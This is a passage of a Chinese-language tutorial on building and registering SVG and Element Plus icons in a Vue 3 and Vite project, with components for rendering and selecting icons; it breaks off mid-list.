<h3 data-id="heading-2">核心解决方案</h3>
<p>本文档介绍一套完整的整合方案，包括：</p>
<ol>
<li>✅ SVG 图标通过 vite 插件自动化构建和打包</li>
<li>✅ Element Plus 图标组件库的整合注册</li>
<li>✅ 基础 SVG 图标组件（<code>SvgIcon</code>）的编写</li>
<li>✅ 统一的图标工具方法（<code>useSvgIcon</code>）</li>
<li>✅ 聚合型的通用图标组件（<code>BaseIcon</code>）</li>
<li>✅ 动态图标选择器组件（<code>IconSelect</code>）</li>
<li>✅ 系统配置应用实现</li>
</ol>
<hr/>
<h3 data-id="heading-3">技术栈</h3>








































<table><thead><tr><th>技术</th><th>版本</th><th>用途</th></tr></thead><tbody><tr><td>Vue</td><td>3.x</td><td>前端框架</td></tr><tr><td>Vite</td><td>5.x</td><td>构建工具</td></tr><tr><td>vite-plugin-svg-icons</td><td>2.0.1</td><td>SVG 图标打包插件</td></tr><tr><td>@element-plus/icons-vue</td><td>^2.3.1</td><td>Element Plus 图标库</td></tr><tr><td>TypeScript</td><td>5.x</td><td>类型检查</td></tr><tr><td>SCSS</td><td>-</td><td>样式预处理</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">二、项目中 SVG 图标的构建打包</h2>
<h3 data-id="heading-5">1. 依赖安装</h3>
<p>首先，安装必要的依赖包：</p>
<pre><code class="hljs language-bash" lang="bash">npm install vite-plugin-svg-icons@2.0.1 @element-plus/icons-vue@^2.3.1
<span class="hljs-comment"># 或使用 pnpm</span>
pnpm add vite-plugin-svg-icons@2.0.1 @element-plus/icons-vue@^2.3.1
</code></pre>
<h3 data-id="heading-6">2. SVG 图标文件组织</h3>
<p>建议的项目结构：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">src</span>/
├── assets/
│   └── icons/
│       └── svg/
│           ├── chart<span class="hljs-selector-class">.svg</span>
│           ├── checkbox<span class="hljs-selector-class">.svg</span>
│           └── ... 其他 SVG 文件
</code></pre>
<p><strong>最佳实践</strong>：</p>
<ul>
<li>将所有自定义 SVG 图标放在统一的 <code>src/assets/icons/svg</code> 目录下</li>
<li>SVG 文件命名使用小写和短横线分隔（如 <code>user-add.svg</code>、<code>chart-line.svg</code>）</li>
<li>确保 SVG 文件采用单色设计，便于动态颜色修改</li>
</ul>
<h3 data-id="heading-7">3. Vite 插件配置</h3>
<p><strong>文件：<code>vite/plugins/svg-icon.js</code></strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createSvgIconsPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-svg-icons'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createSvgIcon</span>(<span class="hljs-params">isBuild</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createSvgIconsPlugin</span>({
    <span class="hljs-attr">iconDirs</span>: [path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons/svg'</span>)],
    <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'icon-[dir]-[name]'</span>,
    <span class="hljs-attr">svgoOptions</span>: isBuild
  })
}
</code></pre>
<p><strong>参数说明</strong>：</p>





















<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>iconDirs</code></td><td>SVG 文件所在目录，支持多个目录数组</td></tr><tr><td><code>symbolId</code></td><td>SVG symbol 的 ID 生成规则，生成格式为 <code>icon-{dir}-{name}</code></td></tr><tr><td><code>svgoOptions</code></td><td>SVGO 配置，构建时启用 SVG 优化，提高性能</td></tr></tbody></table>
<p><strong>工作原理</strong>：</p>
<ul>
<li>扫描指定目录下的所有 SVG 文件</li>
<li>将 SVG 文件转换为 SVG symbol</li>
<li>合并成一个包含所有图标的 symbol 文件</li>
<li>生成虚拟模块 <code>virtual:svg-icons-register</code>，可在应用启动时注册</li>
</ul>
<h3 data-id="heading-8">4. Vite 配置集成</h3>
<p><strong>文件：<code>vite.config.ts</code></strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> createSvgIcon <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite/plugins/svg-icon'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode, command }</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-title function_">vue</span>(),
      <span class="hljs-title class_">AutoImport</span>({
        <span class="hljs-attr">imports</span>: [<span class="hljs-string">'vue'</span>, <span class="hljs-string">'vue-router'</span>, <span class="hljs-string">'pinia'</span>],
        <span class="hljs-attr">dts</span>: <span class="hljs-literal">true</span>,
      }),
      <span class="hljs-title class_">Components</span>({
        <span class="hljs-attr">dts</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">dirs</span>: [<span class="hljs-string">'src/components'</span>, <span class="hljs-string">'src/layout/components'</span>],
        <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'vue'</span>],
        <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">directoryAsNamespace</span>: <span class="hljs-literal">false</span>,
      }),
      <span class="hljs-title function_">createSvgIcon</span>(command === <span class="hljs-string">'build'</span>),
      <span class="hljs-comment">// ... 其他插件</span>
    ],
    <span class="hljs-comment">// ... 其他配置</span>
  }
})
</code></pre>
<p><strong>配置说明</strong>：</p>
<ul>
<li><code>createSvgIcon(command === 'build')</code>：传入构建标志，构建时启用 SVGO 优化</li>
<li>插件顺序很重要，确保 Vue 插件在前，SVG 图标插件在后</li>
<li>这个配置会自动处理 SVG 图标的预处理和注册</li>
</ul>
<hr/>
<h2 data-id="heading-9">三、SVG 组件的编写</h2>
<h3 data-id="heading-10">创建基础 SvgIcon 组件</h3>
<p><strong>文件：<code>src/components/SvgIcon/index.vue</code></strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;svg :class="svgClass" aria-hidden="true"&gt;
    &lt;use :xlink:href="iconName" :fill="color" /&gt;
  &lt;/svg&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { computed } from 'vue'

const props = defineProps({
  // SVG 图标名称（不需要 'icon-' 前缀）
  iconClass: {
    type: String,
    required: true,
  },
  // 自定义 CSS 类名
  className: {
    type: String,
    default: '',
  },
  // 图标颜色
  color: {
    type: String,
    default: '',
  },
})

// 构建 symbol ID
const iconName = computed(() =&gt; `#icon-${props.iconClass}`)

// 计算 CSS 类名
const svgClass = computed(() =&gt; {
  if (props.className) {
    return `svg-icon ${props.className}`
  }
  return 'svg-icon'
})
&lt;/script&gt;

&lt;style scope lang="scss"&gt;
.sub-el-icon,
.nav-icon {
  display: inline-block;
  font-size: 15px;
  margin-right: 12px;
  position: relative;
}

.svg-icon {
  width: 1em;
  height: 1em;
  position: relative;
  fill: currentColor;
  vertical-align: -2px;
}
&lt;/style&gt;
</code></pre>
<p><strong>组件 Props 说明</strong>：</p>





























<table><thead><tr><th>属性</th><th>类型</th><th>必需</th><th>说明</th></tr></thead><tbody><tr><td><code>iconClass</code></td><td>string</td><td>是</td><td>SVG 图标名称，对应文件名（不含 .svg 后缀）</td></tr><tr><td><code>className</code></td><td>string</td><td>否</td><td>额外的 CSS 类名，用于自定义样式</td></tr><tr><td><code>color</code></td><td>string</td><td>否</td><td>图标颜色，直接应用到 SVG 的 fill 属性</td></tr></tbody></table>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- 基础使用 --&gt;
&lt;svg-icon icon-class="chart" /&gt;

&lt;!-- 自定义尺寸（通过 className + CSS） --&gt;
&lt;svg-icon icon-class="checkbox" class-name="lg-icon" /&gt;

&lt;!-- 自定义颜色 --&gt;
&lt;svg-icon icon-class="chart" color="#ff0000" /&gt;
</code></pre>
<p><strong>样式说明</strong>：</p>
<ul>
<li><code>width: 1em; height: 1em</code>：使用 em 单位，可通过父元素的 <code>font-size</code> 控制大小</li>
<li><code>fill: currentColor</code>：默认继承文本颜色，便于通过 CSS 动态改变颜色</li>
<li><code>vertical-align: -2px</code>：微调垂直对齐，避免与文本不对齐</li>
</ul>
<hr/>
<h2 data-id="heading-11">四、组件库图标的注册</h2>
<h3 data-id="heading-12">1. 创建 Element Plus 图标注册文件</h3>
<p><strong>文件：<code>src/components/SvgIcon/svgicon.js</code></strong></p>
<p>此文件通常用于集中导出 Element Plus 图标库或自定义图标插件。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">ElementPlusIcons</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@element-plus/icons-vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ElementPlusIcons</span>
</code></pre>
<h3 data-id="heading-13">2. 在 main.ts 中注册</h3>
<p><strong>文件：<code>src/main.ts</code> (第 16-20 行)</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// svg 图标</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:svg-icons-register'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SvgIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/SvgIcon/index.vue'</span>
<span class="hljs-keyword">import</span> elementIcons <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/SvgIcon/svgicon'</span>
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li><code>virtual:svg-icons-register</code>：Vite 虚拟模块，自动注册所有 SVG 图标</li>
<li>导入 <code>SvgIcon</code> 组件供全局使用</li>
<li>导入 Element Plus 图标库</li>
</ul>
<p><strong>文件：<code>src/main.ts</code> (第 57-58 行)</strong></p>
<pre><code class="hljs language-typescript" lang="typescript">app.<span class="hljs-title function_">use</span>(elementIcons)
app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'svg-icon'</span>, <span class="hljs-title class_">SvgIcon</span>)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li><code>app.use(elementIcons)</code>：注册 Element Plus 图标库</li>
<li><code>app.component('svg-icon', SvgIcon)</code>：注册 SvgIcon 为全局组件</li>
<li>注册后可在任何地方直接使用 <code>&lt;svg-icon /&gt;</code> 组件</li>
</ul>
<h3 data-id="heading-14">3. 完整的 main.ts 示例</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>
<span class="hljs-keyword">import</span> pinia <span class="hljs-keyword">from</span> <span class="hljs-string">'./stores'</span>

<span class="hljs-comment">// 样式导入</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./styles/reset.scss'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./styles/theme.scss'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>

<span class="hljs-comment">// SVG 图标相关导入</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:svg-icons-register'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SvgIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/SvgIcon/index.vue'</span>
<span class="hljs-keyword">import</span> elementIcons <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/SvgIcon/svgicon'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

app.<span class="hljs-title function_">use</span>(pinia)
app.<span class="hljs-title function_">use</span>(router)
app.<span class="hljs-title function_">use</span>(elementIcons)  <span class="hljs-comment">// 注册 Element Plus 图标</span>
app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'svg-icon'</span>, <span class="hljs-title class_">SvgIcon</span>)  <span class="hljs-comment">// 注册 SvgIcon 组件</span>
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<hr/>
<h2 data-id="heading-15">五、图标工具方法</h2>
<h3 data-id="heading-16">useSvgIcon Composable</h3>
<p><strong>文件：<code>src/compositions/useSvgIcon.ts</code></strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">ElementPlusIcons</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@element-plus/icons-vue'</span>

<span class="hljs-comment">// 使用 glob 导入获取 svg 目录下的所有文件</span>
<span class="hljs-keyword">const</span> svgModules = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">glob</span>&lt;{ <span class="hljs-attr">default</span>: <span class="hljs-built_in">string</span> }&gt;(<span class="hljs-string">'/src/assets/icons/svg/*.svg'</span>, {
  <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span>,
})

<span class="hljs-comment">// 提取文件名（不含扩展名）</span>
<span class="hljs-keyword">const</span> svgIconNames = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(svgModules)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">path</span> =&gt;</span> {
    <span class="hljs-keyword">return</span> path.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>()?.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.svg'</span>, <span class="hljs-string">''</span>) || <span class="hljs-string">''</span>
  })
  .<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useSvgIcon</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// SVG 图标列表</span>
  <span class="hljs-keyword">const</span> svgIcons = ref&lt;<span class="hljs-built_in">string</span>[]&gt;([])

  <span class="hljs-comment">// Element Plus 图标列表</span>
  <span class="hljs-keyword">const</span> elementPlusIcons = ref&lt;<span class="hljs-built_in">string</span>[]&gt;([])

  <span class="hljs-comment">// 初始化 Element Plus 图标列表</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">initElementPlusIcons</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> icons = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">ElementPlusIcons</span>).<span class="hljs-title function_">filter</span>(
      <span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> !key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'_'</span>) &amp;&amp; key !== <span class="hljs-string">'default'</span>
    )
    elementPlusIcons.<span class="hljs-property">value</span> = icons
  }

  <span class="hljs-comment">// 获取 SVG 图标列表</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadSvgIcons</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      svgIcons.<span class="hljs-property">value</span> = svgIconNames
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Failed to load SVG icons:'</span>, error)
    }
  }

  <span class="hljs-comment">// 判断是否为 SVG 图标</span>
  <span class="hljs-keyword">const</span> isSvgIcon = (<span class="hljs-attr">iconName</span>: <span class="hljs-built_in">string</span>): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
    <span class="hljs-keyword">return</span> svgIconNames.<span class="hljs-title function_">includes</span>(iconName)
  }

  <span class="hljs-keyword">return</span> {
    svgIcons,
    elementPlusIcons,
    isSvgIcon,
    loadSvgIcons,
    initElementPlusIcons,
  }
}
</code></pre>
<p><strong>API 说明</strong>：</p>



































<table><thead><tr><th>方法/属性</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td><code>svgIcons</code></td><td>Ref&lt;string[]&gt;</td><td>响应式 SVG 图标名称列表</td></tr><tr><td><code>elementPlusIcons</code></td><td>Ref&lt;string[]&gt;</td><td>响应式 Element Plus 图标名称列表</td></tr><tr><td><code>isSvgIcon(iconName)</code></td><td>Function</td><td>判断给定的图标名称是否为 SVG 图标</td></tr><tr><td><code>loadSvgIcons()</code></td><td>Function</td><td>异步加载 SVG 图标列表</td></tr><tr><td><code>initElementPlusIcons()</code></td><td>Function</td><td>初始化 Element Plus 图标列表</td></tr></tbody></table>
<p><strong>工作原理</strong>：</p>
<ol>
<li>
<p><strong>编译时收集</strong>：使用 <code>import.meta.glob</code> 在编译时收集所有 SVG 文件</p>
<ul>
<li>模式 <code>/src/assets/icons/svg/*.svg</code> 匹配目录下的所有 SVG 文件</li>
<li>使用 <code>eager: true</code> 实现同步加载</li>
</ul>
</li>
<li>
<p><strong>提取图标名</strong>：从文件路径中提取图标名称</p>
<ul>
<li>去除路径前缀和 <code>.svg</code> 后缀</li>
<li>例如 <code>/src/assets/icons/svg/chart.svg</code> → <code>chart</code></li>
</ul>
</li>
<li>
<p><strong>Element Plus 图标收集</strong>：</p>
<ul>
<li>使用 <code>Object.keys()</code> 遍历 Element Plus 导出的所有图标</li>
<li>过滤掉以 <code>_</code> 开头的私有属性</li>
<li>收集有效的图标名称</li>
</ul>
</li>
</ol>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useSvgIcon } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/compositions/useSvgIcon'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { svgIcons, elementPlusIcons, isSvgIcon, loadSvgIcons, initElementPlusIcons } = <span class="hljs-title function_">useSvgIcon</span>()

    <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 加载 SVG 图标列表</span>
      <span class="hljs-title function_">loadSvgIcons</span>()
      
      <span class="hljs-comment">// 初始化 Element Plus 图标列表</span>
      <span class="hljs-title function_">initElementPlusIcons</span>()
    })

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkIcon</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isSvgIcon</span>(name)) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span> 是 SVG 图标`</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span> 是 Element Plus 图标`</span>)
      }
    }

    <span class="hljs-keyword">return</span> {
      svgIcons,
      elementPlusIcons,
      checkIcon,
    }
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-17">六、整合的通用组件</h2>
<h3 data-id="heading-18">BaseIcon - 统一的图标聚合组件</h3>
<p><strong>文件：<code>src/components/BaseIcon/index.vue</code></strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-icon&gt;
    &lt;component v-if="iconType === 'element-plus'" :is="getElementPlusIcon(iconName)" /&gt;
    &lt;svg-icon v-else :icon-class="iconName" :class-name="className" :color="color" /&gt;
  &lt;/el-icon&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { computed } from 'vue'
import * as ElementPlusIcons from '@element-plus/icons-vue'
import { useSvgIcon } from '@/compositions/useSvgIcon'
import SvgIcon from '@/components/SvgIcon/index.vue'

const props = defineProps({
  // 图标类型：'svg' 或 'element-plus'，留空时自动判断
  iconType: {
    type: String,
    required: false,
    default: '', // 'svg' | 'element-plus' | ''
  },
  // 图标名称
  iconName: {
    type: String,
    required: false,
    default: '',
  },
  // CSS 类名
  className: {
    type: String,
    default: '',
  },
  // 图标颜色
  color: {
    type: String,
    default: '',
  },
})

const { isSvgIcon } = useSvgIcon()

// 自动判断图标类型
const iconType = computed(() =&gt; {
  return props.iconType || (isSvgIcon(props.iconName) ? 'svg' : 'element-plus')
})

/**
 * 获取 Element Plus 图标组件
 * @param iconName Element Plus 图标名称
 * @returns 图标组件
 */
const getElementPlusIcon = (iconName: string) =&gt; {
  // 将驼峰转换为 PascalCase 格式以匹配 Element Plus 图标命名规则
  const pascalName = iconName
    .split(/[-_]/)
    .map(word =&gt; word.charAt(0).toUpperCase() + word.slice(1))
    .join('')

  return (ElementPlusIcons as Record&lt;string, any&gt;)[pascalName] || null
}
&lt;/script&gt;

&lt;style scoped lang="scss"&gt;
// 继承 SvgIcon 的样式
::v-deep(.svg-icon) {
  width: 1em;
  height: 1em;
  position: relative;
  fill: currentColor;
  vertical-align: -2px;
}
&lt;/style&gt;
</code></pre>
<p><strong>组件特性</strong>：</p>
<ol>
<li>
<p><strong>自动类型判断</strong>：</p>
<ul>
<li>如果提供了 <code>iconType</code> 属性，直接使用</li>
<li>否则使用 <code>isSvgIcon()</code> 方法自动判断图标类型</li>
<li>智能选择使用 <code>SvgIcon</code> 还是 Element Plus 图标</li>
</ul>
</li>
<li>
<p><strong>名称格式转换</strong>：</p>
<ul>
<li>将短横线分隔的名称转换为 PascalCase</li>
<li>例如：<code>user-add</code> → <code>UserAdd</code></li>
<li>确保与 Element Plus 图标命名规则一致</li>
</ul>
</li>
<li>
<p><strong>统一的 Props 接口</strong>：</p>
<ul>
<li>为两类图标提供一致的 API</li>
<li>简化使用时的逻辑判断</li>
</ul>
</li>
</ol>
<p><strong>Props 说明</strong>：</p>



































<table><thead><tr><th>属性</th><th>类型</th><th>必需</th><th>说明</th></tr></thead><tbody><tr><td><code>iconName</code></td><td>string</td><td>是</td><td>图标名称</td></tr><tr><td><code>iconType</code></td><td>string</td><td>否</td><td>图标类型（'svg' 或 'element-plus'），默认自动判断</td></tr><tr><td><code>className</code></td><td>string</td><td>否</td><td>CSS 类名</td></tr><tr><td><code>color</code></td><td>string</td><td>否</td><td>图标颜色</td></tr></tbody></table>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- SVG 图标 --&gt;
  &lt;base-icon icon-name="chart" /&gt;

  &lt;!-- Element Plus 图标 --&gt;
  &lt;base-icon icon-name="plus" /&gt;

  &lt;!-- 自动判断（推荐） --&gt;
  &lt;base-icon :icon-name="dynamicIconName" /&gt;

  &lt;!-- 显式指定类型 --&gt;
  &lt;base-icon icon-name="chart" icon-type="svg" color="#ff0000" /&gt;

  &lt;!-- 自定义样式 --&gt;
  &lt;base-icon 
    icon-name="user-add" 
    class-name="lg-icon" 
    color="#1890ff"
  /&gt;
&lt;/template&gt;
</code></pre>
<p><strong>与其他组件的关系</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">BaseIcon（通用聚合层）
<span class="hljs-code">    ├── SvgIcon（SVG 图标渲染）
    └── Element Plus Icons（组件库图标渲染）
</span></code></pre>
<hr/>
<h2 data-id="heading-19">七、系统动态配置组件</h2>
<h3 data-id="heading-20">IconSelect - 图标选择器组件</h3>
<p><strong>文件：<code>src/components/IconSelect/index.vue</code></strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-select
    v-model="selectedIcon"
    :placeholder="placeholder"
    clearable
    :filterable="true"
    :remote="true"
    :remote-method="handleSearch"
    :loading="loading"
    @change="handleChange"
    class="icon-select"
  &gt;
    &lt;template #prefix&gt;
      &lt;template v-if="selectedIcon"&gt;
        &lt;base-icon :icon-name="selectedIcon" class-name="icon-option__icon" /&gt;
      &lt;/template&gt;
    &lt;/template&gt;

    &lt;el-option-group label="SVG 图标" v-if="filteredSvgIcons.length &gt; 0"&gt;
      &lt;el-option v-for="icon in filteredSvgIcons" :key="icon" :value="icon"&gt;
        &lt;div class="icon-option"&gt;
          &lt;base-icon :icon-name="icon" icon-type="svg" class-name="icon-option__icon" /&gt;
          &lt;span class="icon-option__name"&gt;{{ icon }}&lt;/span&gt;
        &lt;/div&gt;
      &lt;/el-option&gt;
    &lt;/el-option-group&gt;

    &lt;el-option-group label="UI组件库 图标" v-if="filteredElementPlusIcons.length &gt; 0"&gt;
      &lt;el-option v-for="icon in filteredElementPlusIcons" :key="icon" :value="icon"&gt;
        &lt;div class="icon-option"&gt;
          &lt;base-icon :icon-name="icon" icon-type="element-plus" class-name="icon-option__icon" /&gt;
          &lt;span class="icon-option__name"&gt;{{ icon }}&lt;/span&gt;
        &lt;/div&gt;
      &lt;/el-option&gt;
    &lt;/el-option-group&gt;
  &lt;/el-select&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { ref, computed, onMounted } from 'vue'
import SvgIcon from '../SvgIcon/index.vue'
import { useSvgIcon } from '@/compositions/useSvgIcon'

const { svgIcons, loadSvgIcons, initElementPlusIcons, elementPlusIcons } = useSvgIcon()

interface Props {
  modelValue?: string
  placeholder?: string
}

const props = withDefaults(defineProps&lt;Props&gt;(), {
  placeholder: '请选择图标',
})

const emit = defineEmits&lt;{
  'update:modelValue': [value: string | undefined]
  change: [value: string | undefined]
}&gt;()

// 搜索关键词
const searchQuery = ref('')

// 加载状态
const loading = ref(false)

// 选中的图标
const selectedIcon = computed({
  get: () =&gt; props.modelValue,
  set: value =&gt; {
    emit('update:modelValue', value)
  },
})

// 过滤后的 SVG 图标
const filteredSvgIcons = computed(() =&gt; {
  if (!searchQuery.value) return svgIcons.value
  return svgIcons.value.filter(icon =&gt; icon.toLowerCase().includes(searchQuery.value.toLowerCase()))
})

// 过滤后的 Element Plus 图标
const filteredElementPlusIcons = computed(() =&gt; {
  if (!searchQuery.value) return elementPlusIcons.value
  return elementPlusIcons.value.filter(icon =&gt;
    icon.toLowerCase().includes(searchQuery.value.toLowerCase())
  )
})

// 搜索处理
const handleSearch = (query: string) =&gt; {
  searchQuery.value = query
}

// 值变化处理
const handleChange = (value: string | undefined) =&gt; {
  emit('change', value)
}

// 组件初始化
onMounted(() =&gt; {
  loading.value = true
  loadSvgIcons()
  initElementPlusIcons()
  loading.value = false
})
&lt;/script&gt;

&lt;style scoped lang="scss"&gt;
.icon-select {
  width: 100%;

  :deep(.el-input__prefix) {
    display: flex;
    align-items: center;
    justify-content: center;
  }
}

.icon-option {
  display: flex;
  align-items: center;
  gap: 8px;
  width: 100%;

  &amp;__icon {
    font-size: 16px;
    min-width: 20px;
    display: flex;
    align-items: center;
    justify-content: center;

    &amp;--ep {
      font-size: 14px;
      min-width: 18px;
      width: 18px;
    }
  }

  &amp;__name {
    flex: 1;
    word-break: break-all;
  }
}
&lt;/style&gt;
</code></pre>
<p><strong>组件特性</strong>：</p>
<ol>
<li>
<p><strong>双图标源管理</strong>：</p>
<ul>
<li>顶部分组展示 SVG 图标</li>
<li>下方分组展示 Element Plus 图标</li>
<li>分组自动隐藏（如果没有匹配的图标）</li>
</ul>
</li>
<li>
<p><strong>实时搜索过滤</strong>：</p>
<ul>
<li>支持按图标名称搜索</li>
<li>不区分大小写</li>
<li>两个图标源同时过滤</li>
</ul>
</li>
<li>
<p><strong>前缀预览</strong>：</p>
<ul>
<li>已选择的图标实时显示在 Input 前缀区域</li>
<li>用户可直观查看选择的图标效果</li>
</ul>
</li>
<li>
<p><strong>v-model 双向绑定</strong>：</p>
<ul>
<li>支持 v-model 直接绑定</li>
<li>同时发出 <code>change</code> 事件供其他逻辑监听</li>
</ul>
</li>
</ol>
<p><strong>Props 说明</strong>：</p>























<table><thead><tr><th>属性</th><th>类型</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td><code>modelValue</code></td><td>string</td><td>undefined</td><td>选中的图标名称</td></tr><tr><td><code>placeholder</code></td><td>string</td><td>'请选择图标'</td><td>占位符文本</td></tr></tbody></table>
<p><strong>Emits 说明</strong>：</p>




















<table><thead><tr><th>事件</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>update:modelValue</code></td><td>string | undefined</td><td>v-model 更新事件</td></tr><tr><td><code>change</code></td><td>string | undefined</td><td>图标变化事件</td></tr></tbody></table>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- 基础用法 --&gt;
  &lt;icon-select v-model="selectedIcon" /&gt;

  &lt;!-- 自定义占位符 --&gt;
  &lt;icon-select 
    v-model="selectedIcon" 
    placeholder="选择系统图标"
    @change="onIconChange"
  /&gt;

  &lt;!-- 在表单中使用 --&gt;
  &lt;el-form-item label="菜单图标"&gt;
    &lt;icon-select v-model="formData.menuIcon" /&gt;
  &lt;/el-form-item&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { ref } from 'vue'

const selectedIcon = ref('')

const onIconChange = (iconName: string | undefined) =&gt; {
  console.log('选择的图标:', iconName)
  // 可以在这里进行额外处理，如保存到数据库
}
&lt;/script&gt;
</code></pre>
<p><strong>应用场景</strong>：</p>
<ol>
<li>
<p><strong>系统配置界面</strong>：</p>
<ul>
<li>菜单图标配置</li>
<li>按钮图标设置</li>
<li>业务流程图标定义</li>
</ul>
</li>
<li>
<p><strong>内容管理系统</strong>：</p>
<ul>
<li>文章分类图标选择</li>
<li>产品属性图标设置</li>
</ul>
</li>
<li>
